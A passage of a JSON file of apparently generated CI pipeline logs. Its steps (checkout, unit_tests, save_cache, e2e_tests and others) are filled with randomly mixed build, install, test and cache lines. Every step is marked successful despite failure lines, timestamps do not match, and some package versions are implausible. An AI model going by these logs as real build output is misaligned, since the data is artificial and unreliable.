          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_db_connect (83ms)",
          "WARNING: jest has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_db_connect (37ms)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-5272",
          "Cache hit for key-6443",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing axios@4.19.0",
          "  PASS: test_user_create (97ms)",
          "Installing axios@1.0.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-02T12:01:28.686509",
        "finished_at": "2025-12-02T12:01:31.539330",
        "log_lines": [
          "=== Step: checkout ===",
          "Compiling src/app.ts...",
          "Installing eslint@4.2.0",
          "\u2713 test completed",
          "Step 3/10: Building",
          "\u2713 build completed",
          "  PASS: test_auth_login (192ms)",
          "Cache hit for key-8469",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-6101",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (363ms)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (73ms)",
          "Compiling src/index.js...",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/utils.go...",
          "Installing lodash@1.2.0",
          "Step 9/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Installing eslint@1.0.0",
          "Cache hit for key-4850",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (55ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 3/10: Building",
          "Cache hit for key-1686",
          "  PASS: test_user_create (198ms)",
          "Step 2/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 3/10: Building",
          "Installing axios@3.17.0",
          "\u2713 lint completed",
          "Installing prettier@1.20.0",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_cache_hit (397ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:35] INFO: Processing request",
          "Installing axios@1.10.0",
          "Compiling src/handler.rs...",
          "Installing jest@3.16.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 10/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Cache hit for key-9327",
          "Compiling src/service.java...",
          "  PASS: test_user_create (342ms)",
          "Cache hit for key-5400",
          "Cache hit for key-9899",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing express@1.17.0",
          "  PASS: test_cache_hit (369ms)",
          "Step 6/10: Building",
          "Installing prettier@4.8.0",
          "Cache hit for key-1268",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (452ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 6/10: Building",
          "Cache hit for key-1128",
          "Installing react@5.3.0",
          "Step 2/10: Building",
          "Installing eslint@4.17.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/index.js...",
          "Cache hit for key-5143",
          "\u2713 lint completed",
          "Installing express@2.20.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:35] INFO: Processing request",
          "Step 5/10: Building",
          "  PASS: test_auth_login (146ms)",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (492ms)",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/app.ts...",
          "FAILED: test_cache_hit",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2680",
          "  PASS: test_auth_login (327ms)",
          "Installing react@2.2.0",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3659",
          "Cache hit for key-3084",
          "Compiling src/main.py...",
          "Installing lodash@3.8.0",
          "Installing axios@1.14.0",
          "  PASS: test_user_create (2ms)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_cache_hit (413ms)",
          "  PASS: test_cache_hit (488ms)",
          "  PASS: test_api_health (337ms)",
          "[12:00:35] INFO: Processing request",
          "Step 6/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3656",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (89ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_auth_login (391ms)",
          "  PASS: test_user_create (444ms)",
          "Cache hit for key-8467",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-8346",
          "  PASS: test_cache_hit (88ms)",
          "  PASS: test_api_health (125ms)",
          "  PASS: test_api_health (150ms)",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-02T12:01:31.539330",
        "finished_at": "2025-12-02T12:01:38.671382",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache hit for key-5327",
          "Cache hit for key-5445",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-1356",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:35] INFO: Processing request",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (266ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Step 7/10: Building",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-3623",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/service.java...",
          "Installing express@4.6.0",
          "Installing jest@1.9.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Cache hit for key-3122",
          "  PASS: test_db_connect (333ms)",
          "Installing express@4.17.0",
          "WARNING: react has known vulnerabilities",
          "Installing react@3.20.0",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "Step 7/10: Building",
          "  PASS: test_api_health (322ms)",
          "Cache hit for key-4110",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (218ms)",
          "  PASS: test_db_connect (46ms)",
          "Cache hit for key-5084",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "Installing lodash@4.9.0",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Installing react@5.18.0",
          "Compiling src/service.java...",
          "Installing eslint@4.2.0",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (184ms)",
          "Cache hit for key-9223",
          "  PASS: test_api_health (189ms)",
          "  PASS: test_auth_login (202ms)",
          "  PASS: test_auth_login (40ms)",
          "Cache hit for key-7470",
          "\u2713 test completed",
          "Cache hit for key-2660",
          "Cache hit for key-8329",
          "Installing lodash@5.2.0",
          "Installing axios@5.10.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-5508",
          "Step 2/10: Building",
          "Installing react@3.14.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Installing jest@1.1.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing react@2.0.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "  PASS: test_api_health (373ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 6/10: Building",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_user_create (417ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-5851",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-1116",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (321ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-3604",
          "Cache hit for key-5572",
          "\u2713 build completed",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "Cache hit for key-6543",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "[12:00:35] ERROR: Connection failed",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_api_health (232ms)",
          "  PASS: test_api_health (210ms)",
          "Cache hit for key-5492",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_user_create (396ms)",
          "Installing prettier@2.3.0",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (18ms)",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-02T12:01:38.671382",
        "finished_at": "2025-12-02T12:01:45.803434",
        "log_lines": [
          "=== Step: type_check ===",
          "  PASS: test_db_connect (63ms)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Cache hit for key-9579",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_auth_login (439ms)",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "  PASS: test_api_health (141ms)",
          "Installing prettier@1.13.0",
          "Installing axios@4.11.0",
          "Cache hit for key-4231",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing axios@1.8.0",
          "Cache hit for key-4919",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (294ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-9839",
          "Step 10/10: Building",
          "Cache hit for key-9103",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing axios@3.6.0",
          "  PASS: test_db_connect (92ms)",
          "Installing eslint@1.16.0",
          "  PASS: test_db_connect (282ms)",
          "  PASS: test_api_health (450ms)",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing webpack@5.11.0",
          "Installing webpack@1.12.0",
          "Compiling src/main.py...",
          "Installing prettier@5.14.0",
          "  PASS: test_user_create (310ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@4.11.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-9824",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-1883",
          "Compiling src/utils.go...",
          "Cache hit for key-2268",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_user_create (295ms)",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-5016",
          "\u2713 build completed",
          "Installing prettier@3.15.0",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Installing webpack@5.14.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 2/10: Building",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing express@1.15.0",
          "Cache hit for key-8411",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (203ms)",
          "WARNING: jest has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2399",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_user_create (111ms)",
          "Cache hit for key-2391",
          "Installing express@1.18.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Cache hit for key-2104",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (267ms)",
          "[12:00:35] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "Installing prettier@3.12.0",
          "Exception: ValueError",
          "  PASS: test_user_create (93ms)",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_db_connect (427ms)",
          "FAILED: test_cache_hit",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing react@4.9.0",
          "\u2713 test completed",
          "WARNING: axios has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_user_create (481ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-3636",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:35] INFO: Processing request",
          "Installing jest@3.0.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing webpack@3.9.0",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/app.ts...",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_auth_login (384ms)",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-02T12:01:45.803434",
        "finished_at": "2025-12-02T12:02:07.199590",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "  PASS: test_auth_login (203ms)",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (199ms)",
          "Compiling src/service.java...",
          "Cache hit for key-7004",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Step 6/10: Building",
          "  PASS: test_api_health (190ms)",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 test completed",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-9685",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "Installing axios@2.15.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 1/10: Building",
          "[12:00:35] INFO: Processing request",
          "Installing express@4.20.0",
          "Compiling src/index.js...",
          "Cache hit for key-3970",
          "Compiling src/index.js...",
          "[12:00:35] WARN: Deprecated API usage",
          "Installing jest@5.1.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Cache hit for key-4447",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_api_health (114ms)",
          "Compiling src/index.js...",
          "Installing webpack@2.18.0",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-4573",
          "[12:00:35] ERROR: Connection failed",
          "Cache hit for key-3347",
          "  PASS: test_cache_hit (23ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-8917",
          "Installing webpack@3.17.0",
          "Cache hit for key-6840",
          "Step 8/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-9364",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing eslint@2.18.0",
          "  PASS: test_db_connect (335ms)",
          "Installing eslint@4.11.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-9852",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_api_health (424ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (370ms)",
          "Step 8/10: Building",
          "Installing lodash@5.10.0",
          "Cache hit for key-5720",
          "\u2713 lint completed",
          "Cache hit for key-1071",
          "Cache hit for key-7068",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (371ms)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "\u2717 build failed with exit code 97",
          "Exception: ValueError",
          "  PASS: test_api_health (105ms)",
          "Installing jest@1.18.0",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "Exception: NullPointerException",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-1421",
          "Step 9/10: Building",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-4826",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing jest@5.10.0",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Cache hit for key-3188",
          "Step 9/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Installing webpack@5.2.0",
          "Cache hit for key-1327",
          "Artifact uploaded: build.tar.gz (31MB)",
          "  PASS: test_auth_login (36ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_db_connect (232ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_db_connect (441ms)",
          "Installing react@4.15.0",
          "Cache hit for key-5727",
          "Step 6/10: Building",
          "Installing prettier@1.17.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:35] INFO: Processing request",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-02T12:02:07.199590",
        "finished_at": "2025-12-02T12:02:11.478821",
        "log_lines": [
          "=== Step: save_cache ===",
          "  PASS: test_user_create (452ms)",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (136ms)",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-3781",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 1/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 4/10: Building",
          "\u2713 build completed",
          "  PASS: test_db_connect (171ms)",
          "Cache hit for key-9000",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 1/10: Building",
          "Installing lodash@5.11.0",
          "[12:00:35] ERROR: Connection failed",
          "  PASS: test_cache_hit (266ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (394ms)",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "  PASS: test_cache_hit (275ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-3212",
          "Cache hit for key-5564",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_db_connect (413ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (312ms)",
          "Step 8/10: Building",
          "Cache hit for key-7191",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Cache hit for key-7639",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_user_create (300ms)",
          "Cache hit for key-9763",
          "\u2713 lint completed",
          "  PASS: test_api_health (474ms)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-7135",
          "  PASS: test_user_create (377ms)",
          "Cache hit for key-2326",
          "FAILED: test_cache_hit",
          "  PASS: test_db_connect (320ms)",
          "Step 10/10: Building",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Installing lodash@3.11.0",
          "Cache hit for key-4727",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Installing eslint@1.9.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-8026",
          "[12:00:35] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Installing express@4.2.0",
          "  PASS: test_auth_login (496ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Cache hit for key-6749",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "Installing jest@2.6.0",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 4/10: Building",
          "  PASS: test_user_create (440ms)",
          "Cache hit for key-4657",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-2369",
          "  PASS: test_auth_login (194ms)",
          "Cache hit for key-9848",
          "Installing express@4.3.0",
          "Installing react@2.3.0",
          "  PASS: test_user_create (461ms)",
          "Installing webpack@1.9.0",
          "Installing webpack@5.4.0",
          "Compiling src/utils.go...",
          "Cache hit for key-5349",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-1947",
          "[12:00:35] ERROR: Connection failed",
          "  PASS: test_api_health (164ms)",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_user_create (130ms)",
          "[12:00:35] INFO: Processing request",
          "Installing express@5.1.0",
          "Step 2/10: Building",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] ERROR: Connection failed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing lodash@1.10.0",
          "\u2713 build completed",
          "\u2713 test completed",
          "Installing jest@2.18.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-02T12:02:11.478821",
        "finished_at": "2025-12-02T12:02:18.610873",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_api_health (65ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_api_health (464ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_api_health (293ms)",
          "\u2713 test completed",
          "Cache hit for key-8028",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-8899",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-4851",
          "Step 7/10: Building",
          "Compiling src/utils.go...",
          "Step 7/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-2924",
          "Installing jest@2.20.0",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-7939",
          "Cache hit for key-8444",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing react@3.3.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Installing lodash@2.12.0",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "  PASS: test_api_health (423ms)",
          "\u2713 build completed",
          "Step 9/10: Building",
          "[12:00:35] INFO: Processing request",
          "Step 2/10: Building",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2244",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_auth_login (176ms)",
          "Cache hit for key-4653",
          "Installing lodash@1.7.0",
          "  PASS: test_auth_login (203ms)",
          "Installing webpack@4.7.0",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "Cache hit for key-5408",
          "  PASS: test_auth_login (388ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_auth_login (482ms)",
          "Compiling src/index.js...",
          "  PASS: test_user_create (54ms)",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Installing eslint@4.13.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/index.js...",
          "Installing prettier@1.20.0",
          "Compiling src/utils.go...",
          "Cache hit for key-1385",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Step 5/10: Building",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Cache hit for key-6687",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-2777",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 7/10: Building",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing lodash@2.8.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-9807",
          "\u2713 build completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (403ms)",
          "Installing react@4.8.0",
          "  PASS: test_auth_login (49ms)",
          "Cache hit for key-1839",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "Step 8/10: Building",
          "Cache hit for key-1694",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-5770",
          "Step 10/10: Building",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "WARNING: webpack has known vulnerabilities",
